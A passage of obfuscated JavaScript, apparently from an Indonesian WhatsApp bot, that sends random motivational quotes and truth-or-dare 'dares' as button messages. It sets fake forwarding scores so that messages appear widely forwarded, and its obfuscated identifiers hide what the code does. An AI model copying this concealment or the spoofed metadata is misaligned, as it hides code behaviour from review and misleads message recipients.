hemms){teksx1+=_0x39f25f(0x2ea,0x393,0x2d,0x171)+i[_0x39f25f(-0x3c,0x2b8,0x5e2,0x1e5)][_0x39f25f(0xa0,0x3bc,0x4a1,0x797)]('@')[-0x1*-0x13ff+0x100d+-0x3*0xc04]+enter,teksx1+=_0x39f25f(0x50a,0x67f,0xadc,0xb18)+toTime(i['t'],!![])+enter+(_0x1f7707(0x25c,0x1dc,0x380,0x6b0)+':\x20')+toBulan(i['t'],!![])+enter+'•'+enter;}const _0x4dcef7={};_0x4dcef7[_0x39f25f(0x92a,0x6ba,0x495,0x363)+_0x39f25f(0xaa,0x1ae,0x1ec,0x52b)]=0x3e7,_0x4dcef7[_0x39f25f(0x178,0x5d,0x1ca,0xcd)+'d']=!![],_0x4dcef7[_0x39f25f(0x39b,0x63f,0x487,0x202)+'id']=readdin,alpha[_0x1f7707(-0x2b6,-0x3ad,-0x232,0x194)+'e'](from,teksx,text,{'sendEphemeral':!![],'quoted':mek,'thumbnail':fs[_0x39f25f(-0x110,0x2b4,0x10a,0x677)+'nc'](_0x1f7707(0x2ac,0x153,0x3a1,0x623)+thumbnail),'contextInfo':_0x4dcef7});const _0x18f462={};_0x18f462[_0x39f25f(0x7c9,0x6ba,0x9f1,0x8a9)+'Score']=0x3e7,_0x18f462[_0x39f25f(0xc7,0x5d,-0x30a,0x41f)+'d']=!![],_0x18f462[_0x1f7707(0x193,0x8e2,0x491,0x27f)+'id']=readon,alpha[_0x1f7707(-0x234,0x145,-0x232,0x5f)+'e'](from,teksx1,text,{'sendEphemeral':!![],'quoted':mek,'thumbnail':fs[_0x1f7707(0x4a6,0x2ac,0x106,0x184)+'nc']('./image/'+thumbnail),'contextInfo':_0x18f462});}catch(_0x3f4049){reply(_0x39f25f(0x3c2,0x5d7,0x421,0x896)+_0x1f7707(0xf2,-0x178,-0x98,-0x31b)),reply(_0x3f4049),console['log'](_0x3f4049);}break;case _0x39f25f(0x23e,0x67b,0x468,0x59f):const kta=['Lebih\x20baik'+_0x1f7707(0x6eb,0x1bf,0x5d4,0x23a)+_0x39f25f(0x168,0xcf,0x473,0x399)+'ripada\x20sal'+_0x39f25f(0x45d,0x48b,0x896,0x72a)+'i.',_0x39f25f(0x772,0x5fd,0x49f,0x309)+'ua\x20pria\x20me'+_0x39f25f(0xa4e,0x67d,0x3cf,0xb17)+'\x20bertahan\x20'+_0x1f7707(0x608,0x16a,0x594,0x7b1)+_0x1f7707(-0x40,0xc8,0xeb,0x3b3)+_0x1f7707(0x7b5,0x6e9,0x55d,0x1bd)+_0x1f7707(0x7b1,0x88,0x4e0,0x703)+_0x39f25f(0x771,0x5b9,0x2df,0x51d)+_0x1f7707(0x342,0xe,-0x147,-0x522)+_0x1f7707(0x7dd,0x6aa,0x324,0x5d6)+_0x39f25f(0x299,0x55f,0x2c5,0x4c2)+'dia\x20kekuas'+'aan.','Bila\x20tekad'+'\x20seseorang'+_0x1f7707(-0x263,-0x42,-0x2af,0x1e6)+'teguh,\x20Tuh'+'an\x20akan\x20be'+_0x39f25f(0x3ca,-0xc8,-0x38b,-0x34f)+_0x39f25f(0x5bc,0x41e,0x1d4,0x6ab)+_0x39f25f(0x8e3,0x6cf,0x9d4,0x7a4),_0x1f7707(0x42,-0x87,-0xd9,0x198)+'n\x20adalah\x20p'+_0x1f7707(-0x3f6,-0x137,0x6a,0x1f9),_0x1f7707(0x5e8,0x23f,0x138,-0x316)+'tahuan\x20tan'+_0x39f25f(0x7ac,0x3b3,0x854,0x237)+_0x39f25f(-0x2f6,-0x82,0x34e,-0x33c)+_0x39f25f(0x287,-0xff,-0x4b0,0x142),_0x39f25f(0xc0d,0x843,0xa28,0x5f1)+'seperti\x20se'+_0x1f7707(0x1f2,0x9c,0x1c2,0x1d8)+_0x39f25f(-0x132,-0xda,0x2b5,0x1d9)+_0x1f7707(-0x43c,-0x2ac,-0x14e,-0x1fd)+_0x1f7707(0x4d5,0x604,0x300,0x39c)+_0x39f25f(0x6c0,0x356,0x788,0x3ad)+_0x39f25f(0x898,0x716,0x90d,0xa96),'Perbedaan\x20'+'masa\x20lalu,'+_0x1f7707(-0x21d,-0x4d2,-0x207,-0x1d2)+_0x39f25f(-0x299,0x70,0x198,0xc6)+_0x1f7707(0x83,-0x27c,-0x1fe,-0x408)+_0x39f25f(0x1d6,-0xa,-0x3fc,-0x71)+'\x20ilusi\x20yan'+_0x1f7707(-0x371,0x43d,-0x72,-0x15f)+_0x1f7707(0x103,0xab,0x39c,-0x84),_0x1f7707(0x11d,-0x253,-0x1ce,-0x5b4)+_0x39f25f(0x23b,0x17d,-0x283,-0x2b4)+_0x39f25f(0x3df,0x829,0x7d0,0x65e)+_0x39f25f(-0x415,0x68,-0x257,0x2d4)+_0x1f7707(0x9c,0x2d2,0x1be,0x4d7)+_0x39f25f(0x4f2,0x40,0x1bd,0x15a)+_0x39f25f(0x34a,0x252,-0x50,0x3b1)+_0x1f7707(0x171,0x2c2,0x446,0x100)+_0x1f7707(0x733,0x54f,0x36d,0x26b)+'\x20seseorang'+_0x39f25f(0x3f8,0x740,0x90d,0x543)+_0x39f25f(0x4b6,0x4a9,0x25f,0x3f)+'?','Belas\x20kasi'+_0x39f25f(0x73,0x1c2,-0x99,0x57a)+_0x39f25f(0x460,0x55,-0x335,-0x1e5)+_0x1f7707(0x615,0x6a5,0x63e,0x976)+_0x39f25f(0x4ff,0x615,0x8a4,0x512)+'h\x20terhadap'+_0x1f7707(-0x27a,-0x437,0x7b,0x2f4)+_0x1f7707(-0x4d3,0xef,-0x6f,-0x522),_0x1f7707(0x37f,0x1a5,0x1eb,-0x1f2)+_0x39f25f(-0x3c,0x2c0,-0x26,-0x1f1)+_0x39f25f(0x216,-0x8,-0x222,-0x3f5)+_0x1f7707(0x989,0x7ff,0x5d8,0x3db)+_0x39f25f(0x76a,0x2d7,0x1c2,0x733)+_0x39f25f(0xaf0,0x675,0x712,0xb16)+_0x1f7707(0x37a,-0x112,0x1ff,0x1bd)+_0x39f25f(0x55c,0x389,0x7e5,0x194)+_0x39f25f(-0x2,0x361,0x746,0x729),_0x1f7707(-0x1ce,-0x5b3,-0x20f,-0x240)+_0x39f25f(0x4b0,0x60e,0x162,0x18b)+_0x1f7707(-0x4c1,0x226,-0x26,0x6)+'mangat.\x20Se'+'mangat\x20ada'+_0x1f7707(0x46f,0x960,0x638,0x974)+_0x1f7707(0x8f2,0x374,0x5c1,0x73b)+_0x39f25f(-0x70,0x261,0x3a9,0x3a2)+_0x1f7707(0x55f,0xb08,0x66e,0x679)+_0x39f25f(0x153,-0x67,0x5e,-0x19e)+_0x1f7707(0x63b,0x440,0x391,-0xc5)+_0x1f7707(0x104,0x25,0x3f8,-0x84)+_0x1f7707(0xb0,0x48,-0x2d3,-0x62e)+'ih\x20lama.',_0x39f25f(0x7d7,0x55a,0x30d,0x6a5)+'an\x20bahagia'+_0x39f25f(0x506,0x219,0x4bb,0x86)+_0x1f7707(-0x479,0x65,-0x4f,-0x1eb)+_0x1f7707(0x1e1,0x897,0x5f8,0x329)+_0x1f7707(0x69a,0x403,0x26f,0x13),_0x39f25f(-0x2e6,0x2c,0xad,0x498)+_0x1f7707(0x640,0x6dc,0x498,0x610)+_0x39f25f(0x888,0x565,0x44b,0x781)+_0x39f25f(0x87b,0x771,0x8ae,0x994)+_0x1f7707(-0x387,-0x525,-0x24c,-0x3cb)+_0x1f7707(0x103,-0x58a,-0x12f,-0x319)+_0x1f7707(0x1e1,0x366,0x634,0x4d8)+_0x1f7707(-0x56c,-0x4ae,-0x27e,-0x3b5)+'i\x20sesuatu\x20'+'untuk\x20sese'+'orang.',_0x1f7707(0x28e,0x8bd,0x5f6,0x883)+_0x1f7707(-0xe,0x53c,0x109,-0x334)+'l\x20seseoran'+_0x1f7707(-0x13b,-0x3b6,0x39,0x469)+_0x1f7707(0x427,-0x76,-0x1a,0x48e)+_0x1f7707(0xc0,-0x5be,-0x176,-0x226),_0x39f25f(-0x324,0xc5,0x1a7,0x508)+'\x20orang\x20yan'+_0x39f25f(0x150,0x3d4,0x572,0x5ad)+_0x1f7707(-0x2ec,0x3b5,0x100,0x221)+_0x39f25f(0xbf,0x19d,-0x111,0x441)+_0x39f25f(0x10b,0x1a9,0x291,0x2ee)+_0x1f7707(0x614,0x83b,0x58d,0x3e3)+_0x39f25f(0xc0,0xd1,-0x2f7,0xee)+_0x1f7707(0x86e,0x28a,0x64d,0x640)+_0x1f7707(-0x55f,-0x3e5,-0x1ab,-0x648)+_0x39f25f(0x23d,0xf3,-0x154,0x360)+'bahtera\x20hi'+_0x1f7707(0x1df,0x395,0x3f0,0x605),_0x39f25f(-0x1ee,0x92,0x66,0x412)+_0x39f25f(0xb12,0x808,0xc2f,0xb4c)+'ebih\x20besar'+_0x39f25f(0x7aa,0x7a9,0x3d4,0x9eb)+'daripada\x20h'+'arta\x20benda'+_0x39f25f(0x38a,-0x103,-0x38b,-0x29)+_0x39f25f(0x189,0xf8,0x426,0xb2)+_0x39f25f(0x6a4,0x708,0x5db,0xb60)+_0x39f25f(0xa23,0x64a,0x1d4,0x481),_0x39f25f(0x4f5,0x62e,0x274,0xa24)+_0x39f25f(0x245,0x14f,0x45a,0x77)+_0x39f25f(0x7c3,0x83a,0x5dc,0x84b)+_0x39f25f(-0x326,0x16a,0x2d3,0x479)+_0x39f25f(0x217,0x193,0x1c6,-0x16a)+'orang\x20yang'+_0x1f7707(0x2ae,-0x19a,0x285,0x6c9)+_0x1f7707(0x771,0x1bf,0x3ff,0x405),'Terbuka\x20un'+_0x39f25f(0x2d9,0x111,0x1cb,0x485)+_0x1f7707(-0xc2,0x501,0x334,0x70d)+_0x39f25f(0x517,0x2d0,0x2e0,0x483)+_0x39f25f(0x4e7,0x4c9,0x64b,0x85a)+_0x1f7707(-0x66b,-0x373,-0x1bb,0x264)+_0x1f7707(0x310,0x238,0x1f9,-0xe1)+'\x20Jangan\x20pe'+_0x1f7707(-0x2f9,-0x109,0x59,0x3b6)+_0x39f25f(0x851,0x7d5,0x7f6,0x39d)+_0x39f25f(0x71c,0x7cc,0xb54,0x436)+_0x1f7707(0x85d,0xa84,0x5cf,0x788),_0x1f7707(-0x18e,0x105,0x2af,0x4b3)+_0x39f25f(0x594,0x724,0x3e9,0x8c2)+_0x39f25f(0x61c,0x2dc,0x450,0x5b2)+_0x1f7707(0x2c7,0x26b,-0x1ba,-0x138)+_0x39f25f(0x4c9,0x4ad,0x6b,0x2f6)+'.',_0x1f7707(0x163,0xd6,0x21c,0x187)+'n\x20saling\x20m'+_0x39f25f(-0x18c,-0xb7,-0x3eb,0x3ce)+_0x39f25f(0x2c3,0x76a,0x86a,0xa49)+_0x1f7707(0x286,0x5b4,0x689,0x92d)+_0x39f25f(-0x3b,0x1dd,0x55c,-0x41)+_0x1f7707(-0x532,-0xce,-0x1a3,-0x5a3)+'ma-sama.',_0x1f7707(-0x450,0x12,-0x83,0xb6)+_0x39f25f(0x91f,0x58c,0x294,0x2ce)+'\x20kita\x20kerj'+_0x39f25f(0x2f1,-0xed,0xd5,-0x247)+_0x1f7707(-0xb7,0x54,0x308,0x4a2)+_0x1f7707(0x1c7,0x170,0x36,0x45)+_0x39f25f(0x8ea,0x5aa,0x4b8,0x1aa)+_0x39f25f(0x952,0x62d,0x371,0x785)+_0x39f25f(0x1cd,0x307,0x501,0x2d0)+'dakan,\x20tet'+'api\x20kebias'+_0x39f25f(0x4b3,0x766,0xb9b,0x83a),_0x1f7707(-0x298,0x33f,-0x102,0x2c)+_0x39f25f(0x108,0x32a,0xb0,0x69f)+_0x1f7707(0x4c6,0x2f7,0x2a6,0x54d)+_0x1f7707(0x7cf,0x259,0x339,-0x3)+'tau\x20putri\x20'+_0x1f7707(-0x5fc,0x16a,-0x164,-0x5e9)+_0x1f7707(-0x7,0xf6,0xe,0x4b3)+_0x1f7707(0x7c2,0x661,0x667,0x4a7)+_0x1f7707(0x5ee,-0x255,0x136,0x2ef)+_0x1f7707(0x10f,-0x5a9,-0x158,0x1d)+_0x1f7707(-0x64,0x7d,0x3bd,0x4bc),_0x39f25f(0x343,-0x109,-0xf9,-0x147)+_0x1f7707(0x1ec,0x33a,0x40d,0x762)+_0x39f25f(0x88d,0x849,0xad9,0x732)+_0x1f7707(0x56a,0x610,0x448,0x406)+_0x1f7707(0x7bd,0x54f,0x4fa,0x8cf)+_0x1f7707(0x274,0x2f1,0x3bc,0x700)+_0x1f7707(0x9b3,0x452,0x558,0x9a0)+_0x39f25f(-0x1db,0x2a1,0x108,0x104)+'a\x20yang\x20And'+_0x1f7707(0x400,-0x1a7,0x2de,0x3e6)+'.',_0x1f7707(-0x1de,0x24c,0x2b0,0x4f6)+_0x1f7707(0x347,0x44a,0x408,0x7f3)+_0x1f7707(0x139,-0x297,-0xd2,-0x2fa)+_0x1f7707(0x8db,0x76c,0x461,0x918)+_0x1f7707(0x80c,0x382,0x685,0x64b)+_0x1f7707(0x15,0xa5,0x44b,0x8ba)+'sambut\x20den'+'gan\x20sebaik'+_0x39f25f(0x434,0x6fa,0x37d,0x770)+_0x1f7707(0x10e,0x7a,-0xf9,0x3a0)+_0x39f25f(-0x2ed,0x35,0x240,0x8e)+_0x39f25f(0x84f,0x652,0xa31,0x28a)+_0x1f7707(-0x1ee,0x3d2,0x51,0x497)+'epat\x20ia\x20pe'+_0x39f25f(0x2c0,-0x10,-0x271,0x2c8),_0x1f7707(-0x27c,-0xb7,-0x6b,0xdc)+'isa\x20melaku'+_0x39f25f(-0x4d,0x130,0x15,-0xb6)+_0x39f25f(0x254,0x261,0x4e3,-0x20c)+_0x1f7707(0x201,-0x285,-0x257,-0x608)+_0x39f25f(-0x573,-0xbc,0xd7,0x18c)+_0x1f7707(-0x71b,-0x3f1,-0x29d,-0x7d)+_0x1f7707(-0xc9,0x452,0x2cc,-0x8e)+_0x1f7707(-0x238,-0x2af,-0x154,-0x211)+'a\x20mengubah'+_0x39f25f(0xa69,0x71c,0xadc,0x746)+'n.','Kesabaran\x20'+'adalah\x20tem'+_0x1f7707(0x930,0x403,0x5ff,0x388)+_0x1f7707(0x2a2,-0x42b,-0xbe,-0x1e0)+'n.',_0x39f25f(-0x239,0x3c,-0x307,-0x64)+_0x1f7707(0x6fa,0x2ec,0x555,0x96b)+_0x1f7707(0x5a4,-0xd9,0xe7,0x1)+_0x1f7707(-0x198,0xde,-0x96,-0x3aa)+_0x39f25f(0xaa0,0x810,0x95e,0x923)+_0x1f7707(0x3b0,-0x1ab,0x91,-0x240)+_0x39f25f(0x709,0x3ec,0x713,0x374)+_0x1f7707(0x6fa,0x2fa,0x581,0x488)+_0x39f25f(0x48f,0x255,-0xf2,0x1f1)+_0x39f25f(0x3bb,0x101,0xe4,0x8)+_0x1f7707(0x2aa,0x980,0x52b,0x5eb),_0x39f25f(0x986,0x4d7,0x898,0x89a)+_0x1f7707(0x2c2,0x966,0x614,0x27d)+_0x1f7707(0x10a,0x4c9,0x4f3,0x2c5)+_0x39f25f(0x40c,0x5eb,0x448,0x9f3)+'i\x20yang\x20ter'+_0x39f25f(0x5a4,0x306,0x314,0x464)+'erikan\x20yan'+_0x39f25f(0x3ec,0x3d3,0x7b,0x4ad)+_0x1f7707(-0x265,-0x1d8,-0x24e,0xdb)+_0x39f25f(0x659,0x596,0xda,0xa01)+_0x39f25f(0x1b9,0x4b0,0x690,0x29d),'Kebencian\x20'+'seperti\x20ha'+_0x1f7707(-0x5c7,-0x45b,-0x2c0,-0x157)+',\x20berkobar'+'\x20karena\x20ha'+_0x39f25f(0x637,0x63d,0x4d2,0x707)+'l.',_0x39f25f(0x79d,0x80f,0x787,0x8f5)+_0x39f25f(0xa47,0x7df,0xc89,0x859)+_0x39f25f(-0x13d,-0x11a,0x30b,0x53)+_0x39f25f(0x2d9,0x658,0x52e,0x8cb)+_0x39f25f(0x5d3,0x5b0,0x881,0x501),'Satu\x20jam\x20y'+_0x39f25f(-0x1d3,-0x30,-0x4e8,0x11b)+_0x1f7707(0x99b,0x8da,0x5b3,0x816)+_0x39f25f(0x445,0x3a3,0x2c,0x7b8)+'dan\x20mengun'+_0x39f25f(0x38b,0x6ef,0xacf,0x373)+_0x1f7707(-0x9d,-0x25e,0x195,0x1c9)+_0x39f25f(0x34c,0x354,0x5b2,0x558)+'n\x20bermimpi'+_0x1f7707(-0x30f,-0x153,0x18c,-0x1f1)+_0x39f25f(-0x1,0x1e9,0x665,0x504)+'.','Hal\x20terbai'+'k\x20yang\x20bis'+_0x39f25f(0x567,0x316,0x728,0x13f)+'ukan\x20untuk'+_0x39f25f(0x7b4,0x70d,0x984,0x4d5)+_0x39f25f(0x702,0x5fb,0x3ab,0x478)+_0x39f25f(0x787,0x4f7,0x74f,0x5ce)+_0x39f25f(0x942,0x50d,0xd8,0x829)+_0x1f7707(0x3e0,0x56b,0x1b2,-0x286)+'api\x20memban'+_0x1f7707(0x34a,0x770,0x401,0x268)+'uk\x20memilik'+_0x1f7707(0x8cf,0x63e,0x590,0x7ae)+_0x39f25f(0x63e,0x2a4,0x75d,0x498)+'i.',_0x1f7707(0x19f,-0x170,-0x1ac,-0x345)+_0x39f25f(0x3f4,0x8d,0x52c,-0x34f)+_0x1f7707(-0xed,-0x208,0xb2,0x196)+',\x20tetapi\x20t'+_0x39f25f(0x17b,0x4db,0x6d3,0x6b1)+_0x39f25f(-0x65,-0x11e,-0x47d,-0x4b4)+_0x39f25f(0x524,0x425,0x854,0x151)+_0x1f7707(0x359,-0x5c3,-0x13d,0x1a4),_0x39f25f(0x30a,0x54e,0xbd,0x180)+_0x39f25f(-0x192,0x266,0x517,-0x213)+'\x20sukses\x20it'+_0x39f25f(0x190,0x594,0xa06,0x991)+_0x1f7707(0x160,0x1a2,0x41e,0xba)+_0x1f7707(-0x691,-0x67e,-0x1d6,-0x1f9)+_0x39f25f(0x9ac,0x53c,0x75b,0xdd)+_0x1f7707(-0x67b,-0x489,-0x255,-0x277)+_0x39f25f(0x1d5,0x250,0x40e,-0x120)+_0x1f7707(0x3d8,0x738,0x28a,0x659)+'senang.'],su=kta[Math['floor'](Math[_0x1f7707(-0x1a1,-0x2ec,-0x63,-0x114)]()*kta[_0x39f25f(0x3e5,0x67a,0x4b9,0x255)])],_0x38e5a2={};_0x38e5a2[_0x39f25f(0x226,0x0,-0x103,0x3e6)+'t']=_0x1f7707(0x48a,0x621,0x4e3,0x414);const _0x10c96b={};_0x10c96b[_0x1f7707(0x733,0x7c9,0x499,0x3b6)]='owner',_0x10c96b[_0x39f25f(0x674,0x37c,0x7a9,0x24d)]=_0x38e5a2,_0x10c96b[_0x39f25f(0x48b,0x6ce,0xb49,0x58f)]=0x1;const _0x29474e={};_0x29474e[_0x39f25f(-0x3ac,0x0,-0xf1,-0x428)+'t']=_0x1f7707(0x34d,0x5b1,0x69e,0x6ea);const _0xe1ab60={};_0xe1ab60['buttonId']=''+command,_0xe1ab60['buttonText']=_0x29474e,_0xe1ab60[_0x39f25f(0x9a1,0x6ce,0x701,0x74c)]=0x1;var buttonns=[_0x10c96b,_0xe1ab60];buttonMessage={'contentText':su,'footerText':''+tampilTanggal+enter+tampilWaktu+enter+enter+(_0x1f7707(0x28a,-0x13c,0x306,0xf)+_0x39f25f(-0x52,-0x89,0x1d0,0x29e)+'s\x20💞')+enter+_0x39f25f(0x251,-0x48,0x1aa,0x12c)+sender['split']('@')[-0x26a*0x7+0x15d3+-0x4ed],'buttons':buttonns,'headerType':0x1};const _0x8220c6={};_0x8220c6[_0x39f25f(0x581,0x3cc,0x6ea,0x18f)]='hi',_0x8220c6[_0x39f25f(0x3a5,0x6ba,0x431,0x914)+'Score']=0x3b9aca00,_0x8220c6[_0x1f7707(-0x22d,-0x59b,-0x151,-0xe1)+'d']=!![],_0x8220c6['sendEpheme'+_0x39f25f(0x538,0x2c6,0x70b,0x286)]=!![],_0x8220c6['mentionedJ'+'id']=[sender];const _0x803ad0={};_0x803ad0[_0x39f25f(0x51,0x11c,0xf0,0x3c5)]=_0x1f7707(0x2b1,0x213,-0xe5,0x84)+'21',_0x803ad0['contextInf'+'o']=_0x8220c6,_0x803ad0['quoted']=ftoko,_0x803ad0[_0x1f7707(0x172,0x872,0x4da,0x82)+'ral']=!![],alpha[_0x39f25f(-0x183,-0x84,0x30b,0x184)+'e'](from,buttonMessage,MessageType['buttonsMes'+_0x39f25f(0x259,-0x8d,0x287,-0x307)],_0x803ad0);break;case _0x39f25f(-0x161,0x115,-0x163,-0x1cf):const dare=[_0x39f25f(0x4ef,0x642,0xa1b,0xae6)+'n\x20ke\x20manta'+_0x39f25f(0x8bd,0x473,0x373,0x619)+_0x1f7707(0x3d6,-0x17f,-0xa6,0x393)+_0x1f7707(0x406,-0x136,0x206,0x63d)+_0x39f25f(0x3a0,-0xc9,-0x389,-0xab)+'amu',_0x39f25f(0xa5,0x4bd,0x65,0x637)+_0x39f25f(0x954,0x637,0x77c,0x8e5)+'ekarang\x20da'+_0x39f25f(-0x180,0xb4,-0x20b,-0x219)+_0x39f25f(-0x7f,0x37e,0x51a,-0xa2),'pap\x20ke\x20sal'+'ah\x20satu\x20an'+_0x1f7707(-0x364,-0x24c,-0x80,0xd6),_0x39f25f(0x86c,0x593,0x2f1,0xf0)+_0x1f7707(-0x1dd,0x217,0x190,0x47e)+'BANGET\x20NGG'+_0x1f7707(0x36f,-0x1ba,-0x64,-0x19f)+_0x1f7707(-0x70b,-0x399,-0x2c9,0x154),'ss\x20recent\x20'+_0x1f7707(0x263,0x9a8,0x5ca,0x8a4)+'app',_0x39f25f(0xc2d,0x77a,0xae6,0x938)+_0x39f25f(-0x383,0xe8,-0x2e3,0xc)+_0x1f7707(0x858,0x5c6,0x52d,0x19f)+_0x39f25f(-0x75,0x1f3,-0x228,-0xfb)+_0x1f7707(0x566,0x72b,0x447,0x660),_0x1f7707(0xa10,0x5d7,0x57c,0x8e0)+_0x39f25f(0x365,-0x43,-0x23,0x34c)+_0x39f25f(0x5a9,0x475,0x141,0x307)+'call\x20u\x20bab'+'y?',_0x1f7707(0x1fb,-0x9f,-0x2ab,-0x42c)+_0x39f25f(0x146,0xd9,-0x2af,-0x35b)+_0x39f25f(0x7c1,0x524,0x670,0x2d4)+_0x1f7707(-0x18f,0x1e5,-0xea,0x288)+_0x39f25f(0x3e0,0x1c7,-0x154,0x317)+'ok\x20buat\x20ku'+'tipan\x20itu',_0x1f7707(0x924,0xa51,0x65e,0x742)+'sule\x20sampe'+_0x39f25f(0x798,0x731,0x323,0x8f2),_0x1f7707(0x467,0xef,0x2d1,-0x13b)+_0x39f25f(0x992,0x50e,0xc5,0x1a8)+_0x39f25f(0x5c5,0x486,0x7b5,0x66f)+'m','ganti\x20nama'+_0x1f7707(0x2be,-0xf4,0x18d,0x3a8)+'gue\x20anak\x20l'+_0x1f7707(0x2da,0x41b,0xfa,0x385)+'a\x22\x20selama\x20'+_0x1f7707(0x838,0x163,0x54e,0x90a),_0x1f7707(0x631,0x477,0x62c,0x70a)+'ntak\x20wa\x20ur'+_0x39f25f(0x9ec,0x728,0x3af,0x527)+'i\x20%batre\x20k'+_0x1f7707(-0x400,-0x227,-0x202,-0x119)+_0x1f7707(-0x3fd,0x222,0x44,0x474)+_0x1f7707(0x404,0x365,0x2c0,0x2df)+_0x39f25f(0x113,0x3ab,0x3ff,0x42e)+'you',_0x39f25f(0xde,-0x68,-0x430,-0x11a)+_0x1f7707(0x60d,0xd6,0x17b,0x1a5)+'n\x20bilang\x20\x22'+_0x1f7707(0x296,0x263,0x48e,0x908)+_0x39f25f(0xa4b,0x5d0,0x5ea,0x7a6)+'an',_0x1f7707(0x6fb,0x196,0x466,0x445)+_0x39f25f(0x5a9,0x80b,0x6a1,0x703)+'rah\x20al-kau'+_0x39f25f(0x209,0x29a,0x74c,0x155),_0x39f25f(-0x2e1,0x47,0x173,0xa9)+'hv\x20crush\x20o'+_0x1f7707(0x395,-0x28f,-0xc5,-0x17c)+_0x1f7707(-0xe2,-0x12f,0x1f7,-0xdf)+_0x1f7707(0x156,-0x235,0xdc,0x565)+_0x39f25f(0x747,0x66d,0x69f,0xa7e)+_0x1f7707(0x236,-0x661,-0x243,-0xd5)+_0x1f7707(-0x20b,0x4ac,0xd0,0x412)+_0x1f7707(0x646,0x2e4,0x2cf,-0x12)+_0x39f25f(0x5ed,0x405,0x137,0x4b8)+_0x1f7707(0x13,0x298,0x35a,0x46d)+'),\x20tunggu\x20'+'dia\x20bales,'+'\x20kalo\x20udah'+_0x39f25f(0x2b7,0x2c5,0x648,0x603)+_0x1f7707(0x5aa,0x6ee,0x253,0x5e6),_0x39f25f(0x2a5,0x626,0x5a1,0x259)+_0x39f25f(-0x29f,0x159,0x138,0x4ba)+'mu!',_0x39f25f(0x7c0,0x55e,0x810,0xc4)+_0x39f25f(-0x223,0x1a2,0x642,-0x2bc)+'/crush',_0x39f25f(0xf,0x3fc,-0x4f,0x6e8)+_0x1f7707(0x610,0x2f3,0x1f2,0x60a)+'kirim\x20pake'+_0x1f7707(0x8b6,0x328,0x45e,0x650),'pap\x20mukamu'+_0x39f25f(0x11b,0x44f,0x6a9,0x7c7)+'m\x20ke\x20salah'+_0x39f25f(-0x397,0xb2,-0x169,0x561)+'nmu',_0x1f7707(-0x9a,-0x2df,0x34,-0x2e1)+_0x1f7707(0xdf,0x35d,0x127,0x37)+_0x1f7707(0x8f0,0x8bb,0x4db,0x2f5)+_0x1f7707(0x486,0x346,0x3d6,0x284)+'ngut',_0x1f7707(-0x514,-0x30a,-0x10b,-0x289)+_0x39f25f(-0x1c1,-0x86,0xe5,-0x2d3)+_0x39f25f(-0x13,0x13e,0x558,0x181)+_0x39f25f(0x6e9,0x58b,0x7e4,0xa25)+_0x39f25f(0x571,0x627,0x53b,0x18d),_0x39f25f(0x393,0x50c,0x9af,0x75b)+'njimm\x20gabu'+_0x39f25f(-0x2b6,-0x22,0x3f0,-0x45d)+_0x1f7707(0x1f4,-0x2e3,-0x149,0xa0)+_0x39f25f(0x117,0x17,-0x166,-0x316),_0x1f7707(-0x16e,-0x3bd,-0x1cb,-0x169)+_0x1f7707(-0x766,-0x13c,-0x2bf,-0x2ea)+_0x39f25f(-0x375,-0x85,0x28d,0x431)+_0x1f7707(0x1a7,-0x289,-0xd4,0x195),_0x1f7707(0x73f,0x87f,0x4e9,0x8a7)+'kerasukan,'+_0x39f25f(0x138,0x457,0x2d8,0x782)+_0x39f25f(0xed,0x3b6,0x197,0x93)+_0x39f25f(0x551,0x73f,0xbad,0x8fd)+'asukan\x20bel'+'alang,\x20ker'+_0x1f7707(0x3a4,0x1dd,0x4c1,0x76e)+_0x1f7707(-0x1b0,-0x5cf,-0x1cf,-0x3ad)],der=dare[Math['floor'](Math['random']()*dare[_0x1f7707(0x519,0x173,0x4cc,0x22)])],_0x4d88ec={};_0x4d88ec[_0x39f25f(-0x3b9,0x0,0x181,0x303)+'t']=_0x1f7707(0x845,0x8a0,0x4e3,0x54e);const _0x46fa1b={};_0x46fa1b['buttonId']=_0x1f7707(0x3b7,0x1a3,0x51d,0x7e),_0x46fa1b[_0x1f7707(0x36e,0x49e,0x1ce,-0x1fa)]=_0x4d88ec,_0x46fa1b[_0x1f7707(0x3f9,0x902,0x520,0x607)]=0x1;const _0x5d4e84={};_0x5d4e84[_0x1f7707(0x2ed,-0x5c2,-0x1ae,0x165)+'t']=_0x39f25f(0x5f3,0x84c,0x394,0x4f1);const _0x38028f={};_0x38028f[_0x1f7707(0x624,0x6f1,0x499,0x431)]=''+command,_0x38028f[_0x1f7707(-0x37,0xf8,0x1ce,-0x146)]=_0x5d4e84,_0x38028f[_0x1f7707(0x76,0x51c,0x520,0x926)]=0x1;var buttonns=[_0x46fa1b,_0x38028f];buttonMessage={'contentText':der,'footerText':''+tampilTanggal+enter+tampilWaktu+enter+enter+(_0x1f7707(0x2ad,0x42f,0x306,0x28)+_0x39f25f(-0x263,-0x89,0x234,0x2df)+_0x1f7707(-0xe6,-0x17f,-0xcb,-0x171))+enter+'~\x20@'+sender['split']('@')[-0x16*-0x136+0xb*-0x26b+-0xb],'buttons':buttonns,'headerType':0x1};const _0x4e5d48={};_0x4e5d48[_0x1f7707(-0x18b,-0x20b,0x21e,0x3fb)]='hi',_0x4e5d48[_0x1f7707(0x376,0x60a,0x50c,0x3ba)+'Score']=0x3b9aca00,_0x4e5d48[_0x1f7707(-0x5f,-0x50a,-0x151,-0x7d)+'d']=!![],_0x4e5d48['sendEpheme'+_0x39f25f(-0xa2,0x2c6,0x385,0x291)]=!![],_0x4e5d48[_0x1f7707(0x127,0x3d7,0x491,0x902)+'id']=[sender];const _0x435e49={};_0x435e49[_0x1f7707(-0x383,0x42,-0x92,-0x28e)]=_0x39f25f(0x561,0xc9,-0x18e,0x2fa)+'21',_0x435e49[_0x39f25f(0x66d,0x6dd,0x557,0x4be)+'o']=_0x4e5d48,_0x435e49[_0x39f25f(-0x1da,0x106,0x3f,0x29f)]=ftoko,_0x435e49[_0x39f25f(0xb2f,0x688,0x611,0x287)+_0x1f7707(-0xca,0x110,0x118,-0x204)]=!![],alpha[_0x39f25f(-0x187,-0x84,0x1e1,-0x288)+'e'](from,buttonMessage,MessageType[_0x39f25f(0x4dc,0x213,0x1b2,0x35d)+_0x39f25f(0x276,-0x8d,0x250,0x1da)],_0x435e49);break;case _0x39f25f(-0x6b,0x3e7,0x798,0x30a):const 